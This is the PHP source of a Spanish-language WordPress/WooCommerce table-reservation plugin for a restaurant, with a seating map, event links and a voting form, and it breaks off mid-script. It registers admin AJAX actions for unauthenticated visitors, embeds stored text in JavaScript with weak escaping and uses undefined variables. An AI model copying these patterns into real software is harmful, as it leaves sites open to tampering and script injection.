<?php
/**
 * Plugin Name: KaceMaster Elite Reservations (V30 - Full Admin Restored)
 * Description: Generador de links restaurado, Mapa de ocupación imprimible, votaciones, ghost accounts y zero checkout.
 * Version: 30.0
 * Author: Tu Nombre
 */

if (!defined('ABSPATH')) exit;

// Iniciamos sesión segura para trasvasar los datos internamente al checkout
add_action('init', function() {
    if (!session_id()) { session_start(); }
}, 1);

if (!class_exists('KaceMaster_Elite')) {

    class KaceMaster_Elite {

        private $wpdb;
        private $table_name;
        private $table_events;
        private $table_votes;
        private $tables_config;

        public function __construct() {
            global $wpdb;
            $this->wpdb = $wpdb;
            $this->table_name = $wpdb->prefix . 'km_bookings';
            $this->table_events = $wpdb->prefix . 'km_events';
            $this->table_votes = $wpdb->prefix . 'km_votes'; 
            
            $this->load_tables_config();

            register_activation_hook(__FILE__, [$this, 'activate_plugin']);
            
            // SHORTCODES
            add_shortcode('km_reservas', [$this, 'render_frontend']);
            add_shortcode('km_votar', [$this, 'render_voting_frontend']); 
            
            add_action('wp_enqueue_scripts', [$this, 'enqueue_frontend_assets']);
            add_action('admin_menu', [$this, 'add_admin_menu']);
            add_action('admin_enqueue_scripts', [$this, 'enqueue_admin_assets']);

            // AJAX ACTIONS
            $actions = [
                'km_fetch_occupied', 'km_initiate_reservation', 'km_admin_update_reservation', 
                'km_get_adjacent_tables', 'km_create_event_link', 'km_delete_event', 'km_edit_event',
                'km_submit_vote' 
            ];
            foreach($actions as $action) {
                add_action('wp_ajax_' . $action, [$this, 'ajax_' . str_replace('km_', '', $action)]);
                add_action('wp_ajax_nopriv_' . $action, [$this, 'ajax_' . str_replace('km_', '', $action)]);
            }

            // ==========================================
            // WOOCOMMERCE HOOKS (ZERO CHECKOUT & GHOST ACCOUNTS)
            // ==========================================
            if (class_exists('WooCommerce')) {
                add_action('woocommerce_cart_calculate_fees', [$this, 'wc_exact_price_adjustment'], 20, 1);
                add_filter('woocommerce_checkout_fields', [$this, 'wc_remove_all_checkout_fields'], 9999);
                add_action('woocommerce_checkout_create_order', [$this, 'wc_inject_order_billing_data'], 10, 2);
                add_action('woocommerce_checkout_create_order_line_item', [$this, 'wc_add_reservation_meta'], 10, 4);
                add_action('woocommerce_order_status_processing', [$this, 'wc_confirm_reservation']);
                add_action('woocommerce_order_status_completed', [$this, 'wc_confirm_reservation']);
                add_action('woocommerce_order_status_cancelled', [$this, 'wc_cancel_reservation']);
                add_action('woocommerce_order_status_failed', [$this, 'wc_cancel_reservation']);
                add_action('woocommerce_email_order_meta', [$this, 'wc_email_add_reservation_details'], 10, 3);
            }
        }

        private function load_tables_config() {
            $this->tables_config = [
                ['id'=>1, 'x'=>198.7, 'y'=>396.4, 't'=>'t2', 'c'=>2], ['id'=>2, 'x'=>197.5, 'y'=>461.9, 't'=>'t2', 'c'=>2],
                ['id'=>3, 'x'=>361.1, 'y'=>395.3, 't'=>'t4', 'c'=>4], ['id'=>4, 'x'=>415.3, 'y'=>492.9, 't'=>'t4', 'c'=>4],
                ['id'=>5, 'x'=>495.9, 'y'=>583.8, 't'=>'t4', 'c'=>4], ['id'=>6, 'x'=>358.4, 'y'=>581.3, 't'=>'t2', 'c'=>2],
                ['id'=>7, 'x'=>196.5, 'y'=>526.1, 't'=>'t2', 'c'=>2], ['id'=>8, 'x'=>332.1, 'y'=>680.1, 't'=>'t2', 'c'=>2],
                ['id'=>9, 'x'=>197.1, 'y'=>593.4, 't'=>'t4', 'c'=>4], ['id'=>10, 'x'=>202.2, 'y'=>733.5, 't'=>'t4', 'c'=>4],
                ['id'=>11, 'x'=>199.6, 'y'=>663.2, 't'=>'t4', 'c'=>4], ['id'=>12, 'x'=>202.6, 'y'=>794.1, 't'=>'t2', 'c'=>2],
                ['id'=>13, 'x'=>203.2, 'y'=>925.0, 't'=>'t4', 'c'=>4], ['id'=>14, 'x'=>202.6, 'y'=>855.8, 't'=>'t4', 'c'=>4],
                ['id'=>15, 'x'=>203.8, 'y'=>987.9, 't'=>'t2', 'c'=>2], ['id'=>16, 'x'=>206.2, 'y'=>1051.8, 't'=>'t4', 'c'=>4],
                ['id'=>17, 'x'=>465.0, 'y'=>675.9, 't'=>'t4', 'c'=>4], ['id'=>18, 'x'=>465.0, 'y'=>745.0, 't'=>'t4', 'c'=>4],
                ['id'=>19, 'x'=>556.0, 'y'=>675.9, 't'=>'t4', 'c'=>4], ['id'=>20, 'x'=>556.5, 'y'=>743.8, 't'=>'t4', 'c'=>4],
                ['id'=>21, 'x'=>331.0, 'y'=>743.8, 't'=>'t2', 'c'=>2], ['id'=>22, 'x'=>328.6, 'y'=>886.8, 't'=>'t2', 'c'=>2],
                ['id'=>23, 'x'=>328.7, 'y'=>945.2, 't'=>'t2', 'c'=>2], ['id'=>24, 'x'=>445.0, 'y'=>808.6, 't'=>'t2', 'c'=>2],
                ['id'=>25, 'x'=>486.2, 'y'=>864.4, 't'=>'t4', 'c'=>4], ['id'=>26, 'x'=>582.4, 'y'=>873.0, 't'=>'t4', 'c'=>4],
                ['id'=>27, 'x'=>599.0, 'y'=>806.4, 't'=>'t2', 'c'=>2], ['id'=>28, 'x'=>485.6, 'y'=>937.6, 't'=>'t2', 'c'=>2],
                ['id'=>29, 'x'=>486.3, 'y'=>996.5, 't'=>'t2', 'c'=>2], ['id'=>30, 'x'=>549.2, 'y'=>936.4, 't'=>'t2', 'c'=>2],
                ['id'=>31, 'x'=>608.0, 'y'=>937.7, 't'=>'t2', 'c'=>2], ['id'=>32, 'x'=>551.7, 'y'=>996.6, 't'=>'t2', 'c'=>2],
                ['id'=>33, 'x'=>610.4, 'y'=>997.0, 't'=>'t2', 'c'=>2], ['id'=>34, 'x'=>548.4, 'y'=>1122.5, 't'=>'t2', 'c'=>2],
                ['id'=>35, 'x'=>609.6, 'y'=>1123.5, 't'=>'t2', 'c'=>2], ['id'=>36, 'x'=>727.2, 'y'=>796.1, 't'=>'t2', 'c'=>2],
                ['id'=>37, 'x'=>729.0, 'y'=>852.7, 't'=>'t2', 'c'=>2], ['id'=>38, 'x'=>725.8, 'y'=>435.5, 't'=>'t4', 'c'=>4],
                ['id'=>39, 'x'=>652.6, 'y'=>481.0, 't'=>'t4', 'c'=>4], ['id'=>40, 'x'=>722.6, 'y'=>526.4, 't'=>'t4', 'c'=>4]
            ];
        }

        public function activate_plugin() {
            require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
            $charset_collate = $this->wpdb->get_charset_collate();
            
            $s1 = "CREATE TABLE $this->table_name ( 
                id mediumint(9) NOT NULL AUTO_INCREMENT, 
                reservation_code varchar(10) NOT NULL, 
                client_name varchar(100) NOT NULL, 
                client_email varchar(100) DEFAULT NULL, 
                phone varchar(50) NOT NULL, 
                booking_date date NOT NULL, 
                booking_time varchar(10) DEFAULT NULL, 
                guests tinyint(4) NOT NULL, 
                salon_type varchar(50) DEFAULT NULL,
                tables_data text NOT NULL, 
                is_event tinyint(1) DEFAULT 0, 
                event_name varchar(150) DEFAULT NULL,
                status varchar(20) DEFAULT 'pending_payment', 
                advance_payment decimal(10,2) DEFAULT 0.00, 
                wc_order_id bigint(20) DEFAULT 0, 
                created_at datetime DEFAULT CURRENT_TIMESTAMP, 
                PRIMARY KEY (id), KEY booking_date (booking_date) 
            ) $charset_collate;";
            dbDelta($s1);

            $s2 = "CREATE TABLE $this->table_events ( 
                id mediumint(9) NOT NULL AUTO_INCREMENT, 
                event_name varchar(150) NOT NULL, 
                event_date date NOT NULL, 
                price_per_person decimal(10,2) DEFAULT 2000.00,
                popup_text text DEFAULT NULL,
                generated_link text NOT NULL, 
                created_at datetime DEFAULT CURRENT_TIMESTAMP, 
                PRIMARY KEY (id) 
            ) $charset_collate;";
            dbDelta($s2);

            $s3 = "CREATE TABLE $this->table_votes (
                id mediumint(9) NOT NULL AUTO_INCREMENT,
                event_name varchar(150) NOT NULL,
                voter_name varchar(100) NOT NULL,
                voter_email varchar(100) NOT NULL,
                voter_whatsapp varchar(50) NOT NULL,
                created_at datetime DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (id)
            ) $charset_collate;";
            dbDelta($s3);
        }

        public function enqueue_frontend_assets() {
            wp_enqueue_script('sweetalert2', 'https://cdn.jsdelivr.net/npm/sweetalert2@11', [], null, true);
            wp_enqueue_style('google-fonts-km', 'https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap');
        }
        // ==========================================
        // FRONTEND: SHORTCODE [km_votar] (SISTEMA DE VOTOS)
        // ==========================================
        public function render_voting_frontend() {
            $events = $this->wpdb->get_results("SELECT DISTINCT event_name FROM $this->table_events ORDER BY id DESC LIMIT 20");
            ob_start();
            ?>
            <style>
                .km-vote-container { max-width: 450px; margin: 0 auto; background: rgba(20,20,20,0.95); padding: 30px; border-radius: 20px; border: 1px solid #c0392b; box-shadow: 0 10px 30px rgba(0,0,0,0.5); font-family: 'Outfit', sans-serif; color: white; }
                .km-vote-title { text-align: center; color: #f39c12; margin-bottom: 10px; font-weight: 800; text-transform: uppercase; font-size: 1.5rem; }
                .km-input { background-color: #2a2a2a !important; border: 1px solid #444; border-radius: 8px; padding: 12px; color: #ffffff !important; width: 100%; font-family: inherit; margin-bottom: 15px; box-sizing: border-box; }
                .km-input:focus { border-color: #c0392b; outline: none; background-color: #333333 !important; }
                select.km-input { appearance: none; background-image: url('data:image/svg+xml;utf8,<svg fill="%23ffffff" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/><path d="M0 0h24v24H0z" fill="none"/></svg>'); background-repeat: no-repeat; background-position-x: 95%; background-position-y: 50%; }
                select.km-input option { background-color: #2a2a2a !important; color: #ffffff !important; }
                .km-vote-container label { font-size: 0.75rem; color: #aaa; font-weight: 700; text-transform: uppercase; margin-bottom: 5px; display: block; letter-spacing: 0.5px;}
                .btn-elite { background: #c0392b; color: white; border: none; border-radius: 12px; padding: 15px; font-weight: 800; cursor: pointer; width: 100%; text-transform: uppercase; letter-spacing: 1px; box-shadow: 0 5px 15px rgba(192,57,43,0.3); transition: 0.3s; }
                .btn-elite:hover { background: #e74c3c; transform: translateY(-2px); }
            </style>
            <div class="km-vote-container">
                <h2 class="km-vote-title">¡Vota por tu Evento!</h2>
                <p style="text-align:center; font-size:0.9rem; color:#aaa; margin-bottom:20px;">Ayúdanos a decidir qué evento traer próximamente a nuestro escenario.</p>
                <label>Nombre Completo</label><input type="text" id="vote_name" class="km-input" placeholder="Tu nombre...">
                <label>Email</label><input type="email" id="vote_email" class="km-input" placeholder="tu@email.com">
                <label>WhatsApp</label><input type="tel" id="vote_wa" class="km-input" placeholder="+56 9 1234 5678">
                <label>Evento que deseas ver</label>
                <select id="vote_event" class="km-input">
                    <option value="">Selecciona un evento...</option>
                    <?php foreach($events as $ev): ?>
                        <option value="<?php echo esc_attr($ev->event_name); ?>"><?php echo esc_html($ev->event_name); ?></option>
                    <?php endforeach; ?>
                    <option value="Otro">Otro (Sugerencia nueva)</option>
                </select>
                <button class="btn-elite" onclick="submitKmVote()">ENVIAR MI VOTO</button>
            </div>
            <script>
            function submitKmVote() {
                const n = document.getElementById('vote_name').value, e = document.getElementById('vote_email').value;
                const w = document.getElementById('vote_wa').value, ev = document.getElementById('vote_event').value;
                if(!n || !e || !w || !ev) return Swal.fire({icon:'error', title:'Oops', text:'Completa todos los campos', background:'#111', color:'#fff'});
                Swal.fire({title:'Enviando...', allowOutsideClick:false, background:'#111', color:'#fff', didOpen:()=>Swal.showLoading()});
                const fd = new FormData(); fd.append('action', 'km_submit_vote');
                fd.append('name', n); fd.append('email', e); fd.append('wa', w); fd.append('event', ev);
                fetch("<?php echo admin_url('admin-ajax.php'); ?>", {method:'POST', body:fd})
                .then(r=>r.json()).then(res => {
                    if(res.success) Swal.fire({icon:'success', title:'¡Gracias!', text:'Tu voto fue registrado.', background:'#111', color:'#fff'}).then(()=>location.reload());
                    else Swal.fire({icon:'error', title:'Error', text:'Inténtalo de nuevo.', background:'#111', color:'#fff'});
                }).catch(() => Swal.fire({icon:'error', title:'Error', text:'Fallo de conexión.', background:'#111', color:'#fff'}));
            }
            </script>
            <?php
            return ob_get_clean();
        }

        // ==========================================
        // FRONTEND: HTML & CSS (RESERVAS ELITE)
        // ==========================================
        public function render_frontend($atts) {
            $is_event = isset($_GET['evento']) && $_GET['evento'] === 'si';
            $event_name_get = isset($_GET['nombre_evento']) ? sanitize_text_field($_GET['nombre_evento']) : '';
            $pre_date = isset($_GET['fecha']) ? sanitize_text_field($_GET['fecha']) : '';
            $val_d = '';
            
            $price_pp = (int)get_option('km_price_per_person', 2000);
            $popup_txt = get_option('km_popup_text', 'El anticipo es consumible pero NO tiene devolución.');
            $logo_url = trim(get_option('km_logo_url')); 
            $wa_number = trim(get_option('km_whatsapp_number')); 
            
            $raw_open = get_option('km_open_time', '12:00');
            $raw_close = get_option('km_close_time', '21:00');

            // CÁLCULO DE OCUPACIÓN
            $occ_percent = 0;
            $occupied_count = 0;
            $total_tables = 40; 
            
            if ($is_event && !empty($pre_date) && !empty($event_name_get)) {
                $dt = DateTime::createFromFormat('Y-m-d', $pre_date);
                if (!$dt) $dt = DateTime::createFromFormat('d/m/Y', $pre_date);
                
                if ($dt) {
                    $val_d = $dt->format('Y-m-d');
                    
                    $evt_data = $this->wpdb->get_row($this->wpdb->prepare("SELECT price_per_person, popup_text FROM $this->table_events WHERE event_date = %s AND event_name = %s", $val_d, $event_name_get));
                    if ($evt_data) {
                        if (!empty($evt_data->price_per_person)) $price_pp = (int)$evt_data->price_per_person;
                        if (!empty($evt_data->popup_text)) $popup_txt = $evt_data->popup_text;
                    }

                    $bookings = $this->wpdb->get_results($this->wpdb->prepare("SELECT tables_data FROM $this->table_name WHERE booking_date = %s AND status != 'cancelled'", $val_d));
                    $occ_tables = [];
                    foreach($bookings as $b) {
                        $t_arr = json_decode($b->tables_data, true);
                        if(is_array($t_arr)) $occ_tables = array_merge($occ_tables, $t_arr);
                    }
                    $occupied_count = count(array_unique($occ_tables));
                    $occ_percent = round(($occupied_count / $total_tables) * 100);
                }
            }
            $ro = $val_d ? 'readonly' : ''; 
            
            ob_start();
            ?>
            <style>
                html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow-x: hidden; background: #000; }
                .elementor-section, .elementor-column, .elementor-widget { width: 100% !important; max-width: 100% !important; padding: 0 !important; margin: 0 !important; }
                :root { --km-accent: #c0392b; --km-blue: #3498db; --km-glass: rgba(20, 20, 20, 0.95); --km-wood: #8d6e63; }
                #km-app { font-family: 'Outfit', sans-serif; color: #fff; width: 100vw; min-height: 100vh; background: radial-gradient(circle at center, #1a1a1a 0%, #000 100%); display: flex; align-items: center; justify-content: center; position: relative; }
                #km-app .hidden { display: none !important; }
                .km-card-float { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 450px; background: var(--km-glass); border: 1px solid #333; border-radius: 20px; padding: 30px; backdrop-filter: blur(10px); box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
                
                /* Logo arreglado: Más pequeño y centrado */
                .km-logo-img { max-height: 65px; width: auto; max-width: 100%; display: block; margin: 0 auto 15px auto; object-fit: contain; filter: drop-shadow(0 0 5px rgba(0,0,0,0.5)); }
                
                /* Etiqueta del Evento (Badge) */
                .km-event-badge-wrapper { text-align: center; margin-bottom: 15px; }
                .km-event-badge { background: linear-gradient(135deg, #c0392b, #8e44ad); color: white; padding: 6px 18px; border-radius: 30px; display: inline-block; font-size: 0.85rem; font-weight: 800; letter-spacing: 1px; text-transform: uppercase; box-shadow: 0 4px 10px rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.1); }
                
                .km-input { background-color: #2a2a2a !important; border: 1px solid #444; border-radius: 8px; padding: 12px; color: #ffffff !important; width: 100%; font-family: inherit; margin-bottom: 10px; box-sizing: border-box; }
                .km-input:focus { border-color: var(--km-accent); outline: none; background-color: #333333 !important; }
                .km-input:disabled { opacity: 0.6; cursor: not-allowed; border-color: #444; }
                
                select.km-input { appearance: none; background-image: url('data:image/svg+xml;utf8,<svg fill="%23ffffff" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/><path d="M0 0h24v24H0z" fill="none"/></svg>'); background-repeat: no-repeat; background-position-x: 95%; background-position-y: 50%; }
                select.km-input option { background-color: #2a2a2a !important; color: #ffffff !important; }
                
                label { font-size: 0.75rem; color: #aaa; font-weight: 700; text-transform: uppercase; margin-bottom: 5px; display: block; letter-spacing: 0.5px;}
                .btn-elite { background: var(--km-accent); color: white; border: none; border-radius: 12px; padding: 15px; font-weight: 800; cursor: pointer; width: 100%; text-transform: uppercase; letter-spacing: 1px; box-shadow: 0 5px 15px rgba(192,57,43,0.3); transition: 0.3s; }
                .btn-elite:hover { background: #e74c3c; transform: translateY(-2px); }
                
                /* Barra de Ocupación */
                .km-occ-text { font-size: 0.85rem; text-align: center; color: #ddd; margin-bottom: 5px; font-weight: 600; }
                .km-occ-fire { color: #e74c3c; display: inline-block; animation: kmFlicker 0.8s infinite alternate; }
                .km-occ-track { width: 100%; background: #222; border-radius: 10px; height: 12px; margin-bottom: 20px; border: 1px solid #444; overflow: hidden; box-shadow: inset 0 2px 5px rgba(0,0,0,0.5); }
                .km-occ-fill { height: 100%; background: linear-gradient(90deg, #f39c12, #c0392b); width: 0%; transition: width 1.5s ease-out; }
                @keyframes kmFlicker { 0% { transform: scale(0.9); opacity: 0.8; } 100% { transform: scale(1.1); opacity: 1; } }

                /* Mapa SVG */
                #km-step-2 { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 50; display: flex; flex-direction: column; }
                .km-map-container { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; overflow: hidden; }
                .km-svg-full { width: 100%; height: 100%; max-height: 85vh; display: block; touch-action: manipulation; }
                .w { stroke: #fff; stroke-width: 4; stroke-linecap: round; fill: none; opacity: 0.8; }
                .m-g { cursor: pointer; -webkit-tap-highlight-color: transparent; --mesa-fill: var(--km-wood); --mesa-stroke: #555; transition: transform 0.2s; }
                .mesa-shape { fill: var(--mesa-fill); stroke: var(--mesa-stroke); stroke-width: 1.5; transition: fill 0.3s, stroke 0.3s; }
                .silla-shape { fill: #222; stroke: #444; }
                .label-mesa { fill: white; font-weight: bold; font-size: 14px; pointer-events: none; text-anchor: middle; }
                .m-g.recommended { --mesa-fill: var(--km-blue); --mesa-stroke: rgba(255,255,255,0.5); animation: pulseBlue 2s infinite; }
                .m-g.selected { --mesa-fill: var(--km-accent) !important; --mesa-stroke: white !important; opacity: 1 !important; animation: none !important; }
                .m-g.selected .mesa-shape { filter: drop-shadow(0 0 10px #c0392b); transform: scale(1.05); }
                .m-g.occupied { opacity: 0.2; pointer-events: none; filter: grayscale(1); }
                .km-bottom-bar { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 500px; background: rgba(20,20,20,0.95); border: 1px solid var(--km-accent); border-radius: 40px; padding: 10px 25px; display: flex; justify-content: space-between; align-items: center; z-index: 9999; backdrop-filter: blur(10px); }
                
                /* WhatsApp Btn */
                .km-wa-btn { position: fixed; bottom: 20px; left: 20px; background-color: #25D366; color: white; width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 10px rgba(0,0,0,0.3); z-index: 10000; transition: transform 0.3s ease; text-decoration: none; }
                .km-wa-btn:hover { transform: scale(1.1); }
                .km-wa-btn svg { width: 35px; height: 35px; fill: white; }
                @media (max-width: 600px) { .km-wa-btn { width: 50px; height: 50px; bottom: 15px; left: 15px; } .km-wa-btn svg { width: 30px; height: 30px; } }
            </style>
            
            <div id="km-full-screen-app" class="km-fullscreen-overlay">
                <?php if(!empty($wa_number)): ?>
                <a href="https://wa.me/<?php echo esc_attr(preg_replace('/[^0-9]/', '', $wa_number)); ?>" class="km-wa-btn" target="_blank" aria-label="WhatsApp">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zM223.9 414.8c-32 0-63.4-8.6-91-24.8l-6.5-3.8-67.7 17.8 18-65.9-4.2-6.7c-17.7-28-27.1-60.5-27.1-93.5 0-101.4 82.5-184 184.2-184 53.9 0 104.5 21 142.6 59.1 38.1 38.1 59.1 88.8 59.1 142.6 0 101.5-82.6 184.1-184.4 184.1zM324 278.4c-5.5-2.8-32.5-16.1-37.5-17.9-5-1.8-8.7-2.8-12.4 2.8-3.7 5.5-14.2 17.9-17.4 21.6-3.2 3.7-6.5 4.1-12 1.4-5.5-2.8-23.2-8.6-44.2-27.4-16.3-14.6-27.3-32.6-30.5-38.1-3.2-5.5-.3-8.5 2.5-11.3 2.5-2.5 5.5-6.5 8.2-9.7 2.8-3.2 3.7-5.5 5.5-9.2 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.4-30.1-17-41.2-4.5-10.8-9.1-9.3-12.4-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.7 6.9-5 5.5-19.2 18.8-19.2 45.9s19.7 53.2 22.4 56.9c2.8 3.7 38.8 59.2 94.1 83 13.1 5.6 23.3 8.9 31.3 11.4 13.2 4.2 25.2 3.6 34.7 2.2 10.6-1.5 32.5-13.3 37.1-26.1 4.6-12.8 4.6-23.8 3.2-26.1-1.4-2.2-5-3.6-10.5-6.4z"/></svg>
                </a>
                <?php endif; ?>

                <div id="km-app">
                    <div id="km-step-1" class="km-card-float">
                        <?php if(!empty($logo_url)): ?>
                            <img src="<?php echo esc_url($logo_url); ?>" class="km-logo-img" alt="Logo">
                        <?php else: ?>
                            <h2 style="text-align:center; color:var(--km-accent); margin-top:0; letter-spacing: 2px;">RESERVAS ELITE</h2>
                        <?php endif; ?>

                        <?php if($is_event): ?>
                            <div class="km-event-badge-wrapper">
                                <div class="km-event-badge">🎟️ <?php echo esc_html($event_name_get); ?></div>
                            </div>
                            <div class="km-occ-text"><span class="km-occ-fire">🔥</span> Mesas Ocupadas: <span style="color:var(--km-accent);"><?php echo $occupied_count; ?></span>/40</div>
                            <div class="km-occ-track"><div class="km-occ-fill" style="width: <?php echo $occ_percent; ?>%;"></div></div>
                        <?php endif; ?>
                        
                        <div style="margin-bottom:15px;">
                            <label>Nombre Completo</label><input type="text" id="km-name" class="km-input" placeholder="Tu nombre y apellido...">
                            <label>WhatsApp</label>
                            <div style="display:flex; gap:10px;">
                                <select id="km-country" class="km-input" style="width:140px; font-size:0.9rem;">
                                    <option value="+56" selected>Chile (+56)</option>
                                    <option value="+54">Arg (+54)</option>
                                    <option value="+57">Col (+57)</option>
                                    <option value="+1">Can/USA (+1)</option>
                                    <option value="+52">Mex (+52)</option>
                                    <option value="+51">Per (+51)</option>
                                </select>
                                <input type="tel" id="km-phone" class="km-input" placeholder="9 1234 5678" style="flex:1;">
                            </div>
                            <label>Email</label><input type="email" id="km-email" class="km-input" placeholder="correo@ejemplo.com">
                            
                            <div style="display: flex; gap: 10px;">
                                <div style="flex: 1;"><label>Fecha</label><input type="date" id="km-date" value="<?php echo $val_d; ?>" class="km-input" <?php echo $ro; ?>></div>
                                <div style="flex: 1;">
                                    <label>Hora</label>
                                    <select id="km-time" class="km-input">
                                    <?php 
                                    if($is_event) {
                                        $event_times = ['19:30', '20:00', '20:30', '21:00', '21:30'];
                                        foreach($event_times as $et) echo "<option value='$et'>$et</option>";
                                    } else { 
                                        echo '<option value="">--:--</option>'; 
                                        $base_date = '2000-01-01'; $start_ts = strtotime("$base_date $open_time"); $end_ts = strtotime("$base_date $close_time");
                                        if ($end_ts < $start_ts) $end_ts = strtotime("$base_date $close_time +1 day");
                                        $current = $start_ts;
                                        while($current <= $end_ts){ $ts = date('H:i', $current); echo "<option value='$ts'>$ts</option>"; $current = strtotime('+30 minutes', $current); } 
                                    } 
                                    ?>
                                    </select>
                                </div>
                            </div>

                            <?php if (!$is_event): ?>
                            <label>Ubicación Preferida</label>
                            <select id="km-salon" class="km-input">
                                <option value="">Selecciona una opción...</option>
                                <option value="Salón de Vinos">Salón de Vinos</option>
                                <option value="Salón de Velas">Salón de Velas</option>
                            </select>
                            <?php else: ?>
                                <input type="hidden" id="km-salon" value="Evento">
                            <?php endif; ?>

                            <label>Personas (<?php echo number_format($price_pp, 0, ',', '.'); ?> CLP / pers)</label>
                            <select id="km-guests" class="km-input">
                                <?php for($i=2; $i<=10; $i++) echo "<option value='$i'>$i Personas</option>"; ?>
                            </select>
                        </div>
                        <input type="hidden" id="km-is-event" value="<?php echo $is_event ? '1' : '0'; ?>">
                        <input type="hidden" id="km-event-name" value="<?php echo esc_attr($event_name_get); ?>">
                        <button class="btn-elite" onclick="KM.init()">
                            <?php echo $is_event ? 'SELECCIONAR MESAS' : 'CONTINUAR AL PAGO'; ?>
                        </button>
                    </div>
                    
                    <div id="km-step-2" class="hidden" style="width:100%; height:100%;">
                        <button onclick="location.reload()" style="position:absolute; top:20px; left:20px; z-index:100; background:rgba(0,0,0,0.5); color:white; border:1px solid #555; padding:8px 15px; border-radius:20px; cursor:pointer;">&larr; Volver</button>
                        <div class="km-map-container">
                            <svg viewBox="120 320 760 1050" class="km-svg-full" preserveAspectRatio="xMidYMid meet">
                                <defs><g id="t2"><rect x="-17" y="-24" width="34" height="48" rx="4" class="mesa-shape"/><rect x="-24" y="-14" width="7" height="28" rx="2" class="silla-shape"/><rect x="17" y="-14" width="7" height="28" rx="2" class="silla-shape"/></g><g id="t4"><rect x="-24" y="-24" width="48" height="48" rx="4" class="mesa-shape"/><rect x="-14" y="-30" width="28" height="7" rx="2" class="silla-shape"/><rect x="-14" y="24" width="28" height="7" rx="2" class="silla-shape"/><rect x="-30" y="-14" width="7" height="28" rx="2" class="silla-shape"/><rect x="24" y="-14" width="7" height="28" rx="2" class="silla-shape"/></g></defs>
                                <g id="walls"><path d="M149 350 L486 349 M147 349 L146 1098 M145 1102 L497 1100 M497 1099 L652 1332" class="w"/><path d="M485 349 L578 476 M737 380 L579 477 M823 505 L736 380 M676 606 L824 505" class="w"/><path d="M753 720 L676 606 M753 923 L753 720 M792 925 L752 923 M796 1229 L794 927" class="w"/><path d="M690 740 L692 1233 M796 1229 L693 1232 M693 925 L750 922 M745 1330 L744 1233" class="w"/><path d="M652 1334 L745 1331 M419 352 L692 741 M298 352 L298 980 M255 977 L257 353" class="w"/><path d="M301 637 L617 639 M675 605 L579 476 M736 780 L773 778" class="w"/></g>
                                <g id="escenario">
                                    <rect x="696" y="930" width="94" height="295" rx="15" fill="#ffffff" stroke="#dddddd" stroke-width="2"/>
                                    <text x="743" y="1077" transform="rotate(90, 743, 1077)" fill="#000000" font-size="34" font-weight="800" font-family="Outfit, sans-serif" letter-spacing="2" text-anchor="middle">Escenario</text>
                                </g>
                                <g id="km-tables-group"></g>
                            </svg>
                        </div>
                        <div class="km-bottom-bar"><div style="color:white; font-size:0.9rem;"><span id="km-status">Elige mesa</span><br><span id="km-count" style="color:var(--km-accent); font-weight:bold;">0/0</span></div><button id="km-confirm" disabled onclick="KM.preConfirm()" style="background:var(--km-accent); border:none; color:white; padding:8px 20px; border-radius:20px; font-weight:bold; opacity:0.5; cursor:not-allowed;">CONFIRMAR Y PAGAR</button></div>
                    </div>
                </div>
            </div>
            <script>
            // KM_CFG.price_pp contiene el precio real a mostrar al cliente (del evento o general)
            const KM_CFG = { 
                ajax: "<?php echo admin_url('admin-ajax.php'); ?>", 
                tables: <?php echo json_encode($this->tables_config); ?>, 
                max_dist: 160, // Distancia máxima permitida entre mesas seleccionadas
                price_pp: <?php echo $price_pp; ?>,
                popup_text: `<?php echo addslashes($popup_txt); ?>`
            };
            
            const KM = {
                // Estado actual de la reserva
                st: { n:'', p:'', e:'', d:'', t:'', g:0, evt:0, evname:'', s:[], sd:[], cap:0, salon:'' },
                rec: [],
                
                init: function() {
                    const n = document.getElementById('km-name').value;
                    const e = document.getElementById('km-email').value;
                    const d = document.getElementById('km-date').value;
                    const t = document.getElementById('km-time').value;
                    const g = document.getElementById('km-guests').value;
                    const evt = document.getElementById('km-is-event').value;
                    const evname = document.getElementById('km-event-name').value;
                    
                    // Capturar el Salón
                    const salonInput = document.getElementById('km-salon');
                    const salon = salonInput ? salonInput.value : '';

                    // Concatenar código de país y número
                    const code = document.getElementById('km-country').value;
                    const num = document.getElementById('km-phone').value;
                    
                    if(!num) return Swal.fire({icon:'error', title:'Faltan datos', text:'Ingresa tu número de WhatsApp', background:'#111', color:'#fff'});
                    const fullPhone = code + " " + num;

                    if(!n || !d || !t || !e) return Swal.fire({icon:'error', title:'Faltan datos', text:'Por favor completa tu nombre, email, fecha y hora.', background:'#111', color:'#fff'});
                    
                    if (evt !== '1') {
                        // === RESERVA NORMAL: VALIDAR SALÓN Y SALTAR MAPA ===
                        if (!salon || salon === "") return Swal.fire({icon:'warning', title:'Atención', text:'Por favor selecciona si prefieres el Salón de Vinos o el Salón de Velas.', background:'#111', color:'#fff'});
                        
                        // Guardar datos en el estado y forzar la capacidad para pasar la validación
                        this.st = { n:n, p:fullPhone, e:e, d:d, t:t, g:parseInt(g), evt:evt, evname:'', s:[], sd:[], cap:parseInt(g), salon: salon };
                        
                        // Ir directo a confirmar (salta el mapa)
                        this.preConfirm();

                    } else {
                        // === EVENTO: CARGAR MAPA (Con sistema Anti-Congelamiento) ===
